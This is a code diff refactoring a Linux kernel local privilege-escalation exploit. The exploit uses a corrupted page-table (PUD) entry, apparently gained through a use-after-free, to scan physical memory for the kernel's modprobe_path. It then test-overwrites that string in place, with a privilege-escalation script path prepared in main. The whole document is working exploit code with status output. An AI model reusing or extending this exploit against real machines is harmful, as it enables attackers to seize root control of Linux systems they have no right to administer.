@@ -298,13 +298,26 @@ int is_kernel_base(const void *addr)
 
 #define CONFIG_PHYSICAL_ALIGN 0x200000
 
-void *guess_modprobe(void *memory, size_t memory_size, char *modprobe_path, size_t modprobe_buf_len,
-		     size_t modprobe_path_len)
+void *guess_modprobe(void *memory, size_t memory_size)
 {
+	int ret = EXIT_FAILURE;
+	char modprobe_path[KMOD_PATH_LEN] = { 0 };
+	size_t modprobe_path_len = 0;
 	char *search = NULL;
 	char *base;
 	char *end = (char *)memory + memory_size;
 	char *modprobe_path_uaddr = NULL;
+
+	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
+	if (ret == EXIT_FAILURE)
+		return NULL;
+
+	if (modprobe_path[0] != '/') {
+		printf("[-] unexpected modprobe_path\n");
+		return NULL;
+	}
+
+	modprobe_path_len = strlen(modprobe_path);
 
 	for (base = memory; base < end; base += CONFIG_PHYSICAL_ALIGN) {
 		if (!is_kernel_base(base))
@@ -316,11 +329,12 @@ void *guess_modprobe(void *memory, size_t memory_size, char *modprobe_path, size
 			if (!modprobe_path_uaddr)
 				break;
 
+			printf("[!] original modprobe_path: %s\n", modprobe_path);
 			printf("[+] modprobe_path candidate at %p\n", modprobe_path_uaddr);
 
 			/* Test overwrite */
 			modprobe_path_uaddr[0] = 'x';
-			if (get_modprobe_path(modprobe_path, modprobe_buf_len))
+			if (get_modprobe_path(modprobe_path, sizeof(modprobe_path)))
 				return NULL;
 
 			if (modprobe_path[0] != 'x') {
@@ -427,9 +441,7 @@ int main(void)
 	long reserved_from_n = 0;
 	long uaf_n = 0;
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
-	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	unsigned long phys_addr = 0;
-	size_t modprobe_path_len = 0;
 	struct sysinfo info;
 	int ram_gb;
 
@@ -552,18 +564,9 @@ int main(void)
 		if (val == MAGIC_VAL)
 			continue;
 
-		printf("[+] corrupted PUD entry is detected, now search modprobe addr\n");
-
-		/* extract modprobe_path */
-		if (get_modprobe_path(modprobe_path, sizeof(modprobe_path)))
-			goto end;
-
-		modprobe_path_len = strlen(modprobe_path);
-
+		printf("[+] corrupted PUD entry is detected, now search modprobe_path\n");
 		for (int j = 0; j < ram_gb; j++) {
-			modprobe_path_uaddr = guess_modprobe(addr, PUD_SIZE, modprobe_path,
-							     sizeof(modprobe_path),
-							     modprobe_path_len);
+			modprobe_path_uaddr = guess_modprobe(addr, PUD_SIZE);
 			if (modprobe_path_uaddr != NULL)
 				break;
 
